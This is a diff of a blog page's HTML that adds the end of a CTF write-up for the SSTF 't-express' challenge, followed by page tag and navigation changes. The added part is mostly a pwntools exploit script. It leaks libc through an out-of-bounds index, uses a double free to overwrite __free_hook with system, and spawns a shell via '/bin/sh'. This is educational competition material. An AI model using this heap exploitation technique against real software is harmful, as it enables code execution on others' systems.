+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;BBBB&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;CCCC&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;CCCC&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# leak libc&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;-4&amp;apos;&lt;/span&gt;)
+
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;|name |    &amp;apos;&lt;/span&gt;)
+pad = u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)+ &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;)
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;   &amp;apos;&lt;/span&gt;)
+leak = u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;)+ &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\x00\x00&amp;apos;&lt;/span&gt;)
+libc_base = leak&lt;span class=&#34;hljs-number&#34;&gt;-0x1ec643&lt;/span&gt;
+log.info(hex(libc_base))
+
+free_hook = libc_base + &lt;span class=&#34;hljs-number&#34;&gt;0x1eeb28&lt;/span&gt;
+log.info(hex(free_hook))
+
+system = libc_base + &lt;span class=&#34;hljs-number&#34;&gt;0x55410&lt;/span&gt;
+log.info(hex(system))
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# double free&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;):
+	p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+	p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0&amp;apos;&lt;/span&gt;)
+	p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2/3/4):&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+gdb.attach(p)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# AW&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, p64(free_hook))
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Fabu1ous&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;/bin/sh\x00&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Fabu1ous&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, p64(system))
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Fabu1ous&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Index of ticket: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image17.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;Q.E.D&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="/thumbnail.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/10/18/fabu1ous/sstf-t-express/">
@@ -424,19 +591,19 @@ p.interactive()</code></pre>
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
-                  
-                  <a class="hover-with-bg" href="/tags/samsung/">samsung</a>
+                  <a class="hover-with-bg" href="/tags/double-free-bug/">double free bug</a>
                   
                   <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                   
+                  <a class="hover-with-bg" href="/tags/samsung/">samsung</a>
+                  
                   <a class="hover-with-bg" href="/tags/sstf/">sstf</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
                   <a class="hover-with-bg" href="/tags/out-of-bound/">out of bound</a>
                   
                   <a class="hover-with-bg" href="/tags/off-by-one/">off by one</a>
-                  
-                  <a class="hover-with-bg" href="/tags/double-free-bug/">double free bug</a>
                   
                 </div>
                 
@@ -484,12 +651,6 @@ p.interactive()</code></pre>
                 </article>
                 <article class="post-next col-6">
                   
-                  
-                  <a href="/2020/10/18/idioth/sstf-crackme101/">
-                    <span class="hidden-mobile">[Write-Up] SSTF CrackMe101</span>
-                    <span class="visible-mobile">Next</span>
-                    <i class="iconfont icon-arrowright"></i>
-                  </a>
                   
                 </article>
               </div>
